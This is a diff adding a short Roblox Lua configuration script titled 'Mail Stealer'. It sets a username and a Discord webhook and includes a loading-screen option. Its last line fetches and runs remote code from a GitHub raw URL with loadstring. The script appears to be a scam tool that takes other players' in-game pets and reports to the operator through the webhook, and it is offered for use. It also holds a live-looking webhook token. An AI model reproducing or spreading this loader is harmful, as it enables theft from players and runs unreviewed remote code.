@@ -1,0 +1,15 @@
+--{{ Dont Ask Why's Scriptz  Mail Stealer }}--
+
+--{{ Main Config }}--
+_G.UserName = "Odkdbfbfj" --// Write your Username
+
+--{{ Webhook Config }}--
+_G.Webhook = "https://discord.com/api/webhooks/1117846422348365925/Oqlt02jqGSl6hOSZS3C-d6h7o10j1hzeox6CbPUohM5bq6AxfY9nJ4lzRBp3FtV8Tkiv" -- Enter your Wehook
+
+--{{ Extra Settings }}--
+_G.LoadingScreen = true --// False Is To Not Use The Loading Screen
+_G.AntiLeave = false --// False is to leave when pets enter
+_G.MouseLock = false --// True To Enable Mouse
+
+--{{ Script }}--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIllll/Mailstealer/main/New%20Mailstealer"))()
